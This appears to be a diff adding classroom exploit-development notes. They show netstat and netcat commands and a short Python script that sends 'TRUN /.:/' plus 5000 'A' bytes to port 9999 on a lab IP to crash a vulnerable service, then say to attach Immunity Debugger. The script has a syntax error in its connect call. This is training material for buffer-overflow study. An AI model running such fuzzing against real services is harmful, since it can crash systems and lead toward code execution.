@@ -1,0 +1,126 @@
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!DEMO!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+
+PS$> netstat -nob
+PS$> 
+
+linops$> nc 10.50.154.147 <port>
+  mkdir win-exp-dev
+  vim ....py
+
+
+          #!/usr/bin/python
+          import socket 
+          buffer = "TRUN /.:/"
+          buffer += "A" *5000
+  #network connection
+          s = socket.socket (socket.AF_INET,socket.SOCK_STREAM)
+          s.connect(("10.50.154.147, 9999))
+          print s.recv(1024)
+          s.send(buffer)
+          print s.recv(1024)
+          s.close()
+
+IMMUNITY DEBUGGER - run as admin
+	open .exe (unpause/play button)
+
+
+
+	
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
